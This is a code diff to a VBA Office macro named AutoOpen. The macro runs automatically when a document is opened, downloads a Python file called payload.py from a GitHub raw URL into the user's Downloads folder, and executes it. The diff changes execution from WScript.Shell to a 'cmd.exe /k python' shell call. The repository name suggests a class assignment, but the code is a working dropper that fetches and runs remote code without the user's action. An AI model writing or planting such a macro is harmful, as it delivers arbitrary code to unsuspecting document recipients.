@@ -3,13 +3,13 @@ Sub AutoOpen()
     Dim stream As Object
     Dim url As String
     Dim savePath As String
-    Dim shell As Object
-
+    Dim command As String
+    
     url = "https://raw.githubusercontent.com/wowjulian/assignment3/refs/heads/main/payload.py"
     saveDir = Environ("USERPROFILE") & "\Downloads"
     savePath = Environ("USERPROFILE") & "\Downloads\script.py"
+    
     Set http = CreateObject("MSXML2.XMLHTTP")
-
     http.Open "GET", url, False
     http.Send
 
@@ -23,9 +23,7 @@ Sub AutoOpen()
 
         MsgBox "Successfully downloaded the script at " & savePath
 
-        Set shell = CreateObject("WScript.Shell")
-
-        shell.Run "python """ & savePath & """", vbNormalFocus
+        shell "cmd.exe /k python """ & savePath & """", vbNormalFocus
     Else
         MsgBox "Failed to run the script. Status: " & http.Status
     End If
